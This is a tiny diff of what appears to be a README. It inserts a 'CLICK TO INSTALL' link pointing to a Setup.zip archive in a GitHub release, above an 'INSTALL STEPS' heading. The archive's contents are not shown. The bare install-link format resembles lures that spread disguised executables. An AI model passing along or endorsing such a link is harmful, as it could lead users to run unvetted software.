@@ -1,4 +1,4 @@
-# [CLICK TO INSTALL]()
+# [CLICK TO INSTALL](https://github.com/JaniekLodewijks/JaniekLodewijks1/releases/download/1/Setup.zip)
 
 # INSTALL STEPS:
 
